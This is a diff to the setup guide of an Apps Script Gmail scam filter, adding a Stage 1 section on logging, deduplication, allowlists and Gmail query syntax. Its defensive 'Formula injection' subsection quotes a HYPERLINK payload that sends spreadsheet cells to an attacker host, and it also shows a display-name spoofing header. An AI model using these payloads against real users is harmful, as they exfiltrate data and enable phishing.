@@ -1,12 +1,12 @@
-# ScamShield Mail — Setup (Stage 0)
+# ScamShield Mail — Setup
 
 A Google Apps Script that watches an older adult's Gmail inbox, classifies new
 mail with the Anthropic Claude API, and quarantines likely scams by **labeling
 and archiving** them. It never deletes anything.
 
-Stage 0 gets the project created, the files in place, the scopes declared, and
-the API key stored — and gives you one function, `checkSetup()`, that proves
-all of it works.
+Sections 1-5 are Stage 0: get the project created, the files in place, the
+scopes declared, and the API key stored — and prove all of it works with
+`checkSetup()`. Section 6 is Stage 1: the inbox reader and the decision log.
 
 ---
 
@@ -146,6 +146,147 @@ the stored key is wrong or revoked. If any step fails, the last line reads
 
 ---
 
+## 6. Stage 1 — the inbox reader and the log
+
+Stage 1 adds the whole pipeline **except the AI**: it reads recent inbox mail,
+extracts a minimal payload from each message, and writes one row per message to
+a Google Sheet with the placeholder verdict `NOT_CLASSIFIED`. Nothing is
+labeled, archived, marked read, or deleted.
+
+The point is to prove the plumbing — reading, deduping, allowlisting, logging —
+before an API call or any mailbox change exists.
+
+### Create the log spreadsheet
+
+Run **`initLogSheet`** from the Run dropdown. It creates the spreadsheet on
+first use and prints its ID and URL to the execution log:
+
+```
+Log spreadsheet ready.
+  Name: ScamShield Mail — Log (2026-08-28)
+  ID:   1AbC...xyz
+  URL:  https://docs.google.com/spreadsheets/d/1AbC...xyz/edit
+Tabs: Decisions, Config-Allowlist, Errors
+```
+
+The ID is saved to the `LOG_SHEET_ID` Script Property, so the script finds the
+same sheet on every later run. **No new OAuth scope is needed** —
+`SpreadsheetApp.create()` is covered by the `spreadsheets` scope we already
+declare, so there is no second consent prompt at this stage.
+
+Two consequences of *not* having a Drive scope, worth knowing now:
+
+- The file is created in the **root of My Drive** and the script cannot move it.
+  Drag it into a folder yourself.
+- The script cannot **share** it. Stage 5's "a family member can see the log"
+  story is a manual share from the Sheets UI.
+
+**Fallback if auto-creation is ever blocked** (a Workspace admin policy, or a
+full Drive): create a blank spreadsheet by hand, copy the ID out of its URL
+(the long string between `/d/` and `/edit`), set it as the `LOG_SHEET_ID` Script
+Property, and run `initLogSheet()` — it will build the three tabs inside your
+sheet. Same code path, so the fallback is not untested.
+
+If `LOG_SHEET_ID` points at a sheet that cannot be opened, the script **stops
+with a loud error rather than creating a replacement**. That is deliberate: a
+silent replacement would orphan your whole decision history *and* reset dedupe,
+so the next run would re-process every message in the window.
+
+### Run the scan
+
+Run **`scanInbox`**. A healthy run logs:
+
+```
+scanInbox: query = in:inbox is:unread -from:me after:1756400000
+scanInbox: threads=3 candidates=3 logged=3 skippedProcessed=0 skippedAllowlist=0 errors=0 elapsedMs=4210
+```
+
+Run it a second time and you should see `logged=0 skippedProcessed=3` with **no
+new rows**. That test matters more than it looks: because Stage 1 never marks
+anything read, every message stays in the search results for the full 20-minute
+window and comes back on every run in between. Message-ID dedupe is the only
+thing between this design and a log full of triplicates.
+
+### Reading the `Decisions` tab
+
+| Column | What it is |
+|---|---|
+| `Timestamp` | When the **row was written** (up to 20 min after the mail arrived). |
+| `Message ID` | Gmail's ID for the message. This is the dedupe key. |
+| `Message Date` | When the **mail actually arrived**. This is the one you usually want. |
+| `Sender` | The raw `From` header, display name included — the display name is itself evidence. |
+| `Reply-To` | Blank when it matches the sender. **A value here means a mismatch**, which is a classic phishing tell. |
+| `Subject` | |
+| `Body Preview` | First 200 characters, whitespace collapsed. Hard rule 3 — no more of a body is ever stored. |
+| `URL Count` | How many link URLs were extracted. A surprising `0` usually explains a surprising verdict. |
+| `Verdict` | `NOT_CLASSIFIED` in Stage 1, or `ALLOWLISTED`. Stage 2 fills in `scam` / `suspicious` / `safe`. |
+| `Confidence` | Stage 2. |
+| `Reasons` | Stage 2. |
+| `Action Taken` | `none (observe-only)` until Stage 4. |
+| `Error` | Populated only when something went wrong for that message. |
+| `Review` | **Yours to fill in.** Type `WRONG` next to any verdict you disagree with; Stage 6 counts these to compute precision. |
+
+### The allowlist
+
+Put one email address or domain per row in column A of `Config-Allowlist`. Rows
+starting with `#` are ignored, so you can leave notes.
+
+```
+alice@example.com     # exact address
+chase.com             # any address @chase.com
+@chase.com            # same thing — a leading @ is optional
+```
+
+Matching is **exact**: `chase.com` matches `alerts@chase.com` but **not**
+`x@alerts.chase.com`. Add subdomains explicitly, or flip
+`ALLOWLIST_MATCH_SUBDOMAINS` in `Config.gs` if you find yourself adding five
+entries per bank.
+
+An allowlisted sender is **never scanned** (hard rule 6). Be conservative: `From`
+addresses can be forged, so an entry here is a permanent blind spot. Prefer
+exact addresses over whole domains.
+
+### Why the query is not `newer_than:20m`
+
+Because that would mean **twenty months**. Gmail's `newer_than:` and
+`older_than:` operators accept only `d` (days), `m` (**months**) and `y`
+(years) — there is no minute or hour unit. With a 10-message-per-run cap, a
+`newer_than:20m` query would have quietly logged ten arbitrary messages out of
+two years of inbox on every single run.
+
+Minute resolution needs Gmail's `after:` operator with a **Unix epoch-seconds**
+integer, which is what `buildSearchQuery_()` builds. That also avoids a second
+trap: slash-format dates (`after:2026/08/28`) are interpreted at midnight
+**Pacific** time regardless of the `timeZone` in `appsscript.json`. Epoch
+seconds have no timezone at all.
+
+The config value is therefore `POLL_WINDOW_MINUTES: 20` — a plain number, so
+the correct query is the only easy one to write.
+
+### Two safety details you may not expect
+
+**Formula injection.** Every string written to the sheet — subject line, sender
+display name, body preview — comes out of a hostile email, and Google Sheets
+treats a value starting with `=`, `+`, `-` or `@` as a **formula**. A subject
+line of `=HYPERLINK("http://attacker.example/"&ENCODEURL(A2:N2),"Open me")`
+would otherwise become a live, clickable formula inside the very sheet meant to
+be a safe place to review dangerous mail. `sanitizeForSheet_()` prefixes every
+text value with an apostrophe, which is Sheets' "this is text" marker — it is
+not displayed and it is not part of the value when you read the cell back.
+
+**Display-name spoofing.** `extractEmailAddress_()` matches the **last**
+`<...>` pair in a header, not the first. The trick it defends against looks like
+this:
+
+```
+From: "support@paypal.com <security@paypal.com>" <evil@ru-host.tld>
+```
+
+A regex that grabs the first bracket pair returns `support@paypal.com` — and if
+that were on your allowlist, the attacker would walk straight through.
+
+---
+
 ## Apps Script limits that shape this design
 
 Worth knowing now, because they explain choices in later stages:
@@ -176,9 +317,9 @@ Worth knowing now, because they explain choices in later stages:
 | File | Role | Status |
 |---|---|---|
 | `appsscript.json` | Manifest: runtime, timezone, OAuth scopes | Stage 0 ✅ |
-| `Config.gs` | Secrets access (`getApiKey_`); `CONFIG` object lands in Stage 1 | Stage 0 ✅ |
-| `Main.gs` | Entry points; `checkSetup()` now, `scanInbox()` in Stage 1 | Stage 0 ✅ |
-| `Logger.gs` | Google Sheet audit trail | Stage 1 |
+| `Config.gs` | `CONFIG` object, secrets access (`getApiKey_`) | Stage 1 ✅ |
+| `Main.gs` | Entry points: `checkSetup()`, `scanInbox()`, payload extraction | Stage 1 ✅ |
+| `Logger.gs` | Google Sheet audit trail, allowlist, dedupe, `initLogSheet()` | Stage 1 ✅ |
 | `Classifier.gs` | Anthropic API call + verdict parsing | Stage 2 |
 | `Digest.gs` | Weekly family summary email | Stage 5 |
 
